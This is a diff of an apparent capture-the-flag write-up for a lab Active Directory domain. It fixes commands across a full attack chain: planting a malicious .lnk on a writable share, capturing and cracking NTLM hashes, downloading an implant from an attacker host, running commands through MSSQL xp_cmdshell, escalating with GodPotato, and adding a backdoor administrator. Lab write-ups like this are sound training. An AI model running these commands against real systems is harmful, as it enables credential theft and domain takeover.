@@ -53,7 +53,7 @@ nxc smb hack.smarter -u "" -p "" --shares
 ```
 
 ```
-SMB  10.1.115.168  445  DC01  Share  READ,WRITE
+SMB  10.1.145.243  445  DC01  Share  READ,WRITE
 ```
 
 The `Share` share has **READ/WRITE** access for unauthenticated users — a foothold for hash capture.
@@ -67,7 +67,7 @@ With write access to a share, we can plant a malicious `.lnk` file. When a user 
 ### Step 1 — Generate the malicious files
 
 ```bash
-ntlm_theft.py --verbose --generate modern --server 10.1.115.168 --filename "meetingXYZ"
+ntlm_theft.py --verbose --generate modern --server 10.200.59.205 --filename "meetingXYZ"
 ```
 
 This creates several file types. The `.lnk` is the most reliable for "browse to folder" capture.
@@ -81,7 +81,7 @@ sudo responder -I tun0 -wv
 ### Step 3 — Upload the `.lnk` to the writable share
 
 ```bash
-smbclient //10.1.115.168/Share -U hack.smarter -c 'put meetingXYZ/meetingXYZ.lnk meetingXYZ.lnk'
+smbclient //10.1.145.243/Share -N -c 'put meetingXYZ/meetingXYZ.lnk meetingXYZ.lnk'
 ```
 
 ### Step 4 — Capture the hash
@@ -96,7 +96,7 @@ When a user browses the share, Responder captures their NTLMv2 hash:
 ### Step 5 — Crack offline with Hashcat
 
 ```bash
-hashcat hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 **Cracked:** `bob.ross : 137Password123!@#`
@@ -108,7 +108,7 @@ hashcat hash.txt /usr/share/wordlists/rockyou.txt
 Validate credentials and enumerate users:
 
 ```bash
-nxc smb hack.smarter -u 'bob.ross' -p '137Password123!@#' --rid
+nxc smb hack.smarter -u 'bob.ross' -p '137Password123!@#' --rid-brute
 ```
 
 **Users discovered:**
@@ -131,7 +131,7 @@ No GPP credentials found — moving to BloodHound.
 Collect BloodHound data using `bob.ross`:
 
 ```bash
-nxc ldap dc01.hack.smarter -u 'bob.ross' -p '137Password123!@#' --bloodhound --collection All --dns-server 10.1.115.168
+nxc ldap dc01.hack.smarter -u 'bob.ross' -p '137Password123!@#' --bloodhound --collection All --dns-server 10.1.145.243
 ```
 
 **Key finding:** `bob.ross` has **GenericAll** over `alice.wonderland`.
@@ -228,7 +228,7 @@ Output: `MAGNIFICENT_POLISH.exe`
 python -m http.server 80
 
 # Target — download it
-*Evil-WinRM* PS C:\users\alice.wonderland\desktop> wget http://10.200.59.205/MAGNIFICENT_POLISH.exe -o MAGNIFICENT_POLISH.exe
+*Evil-WinRM* PS C:\users\alice.wonderland\desktop> wget http://10.200.59.205/MAGNIFICENT_POLISH.exe -OutFile MAGNIFICENT_POLISH.exe
 ```
 
 ### Step 4 — Start mTLS listener and execute implant
@@ -272,10 +272,16 @@ socks5 127.0.0.1 1081
 proxychains -q impacket-mssqlclient hack.smarter/'alice.wonderland':'NewPass123!'@127.0.0.1 -windows-auth
 ```
 
+Enable `xp_cmdshell` (disabled by default):
+
+```sql
+SQL> enable_xp_cmdshell
+```
+
 Check privileges of the MSSQL service account:
 
 ```sql
-SQL> xp_cmdshell whoami /priv
+SQL> xp_cmdshell 'whoami /priv'
 ```
 
 ```
@@ -320,7 +326,7 @@ nt service\mssql$sqlexpress
 Transfer to `C:\Temp\` via the `alice.wonderland` Evil-WinRM session:
 
 ```bash
-*Evil-WinRM* PS C:\Temp> wget http://10.200.59.205/GodPotato-NET4.exe -o godpotato.exe
+*Evil-WinRM* PS C:\Temp> wget http://10.200.59.205/GodPotato-NET4.exe -OutFile godpotato.exe
 ```
 
 ### Step 2 — Verify SYSTEM execution
@@ -336,7 +342,7 @@ nt authority\system
 ### Step 3 — Create a local administrator
 
 ```bash
-PS C:\Temp> ./godpotato -cmd "cmd /c net user hacksmarter Hack12345 /add && net localgroup administrators hacksmarter /add"
+PS C:\Temp> ./godpotato.exe -cmd "cmd /c net user hacksmarter Hack12345 /add && net localgroup administrators hacksmarter /add"
 The command completed successfully.
 The command completed successfully.
 ```
@@ -379,3 +385,4 @@ evil-winrm -u hacksmarter -p Hack12345 -i dc01.hack.smarter
 | MSSQL code execution | xp_cmdshell | impacket-mssqlclient |
 | Privilege escalation | SeImpersonatePrivilege → SYSTEM | GodPotato |
 | Persistence | Local admin creation | net user |
+
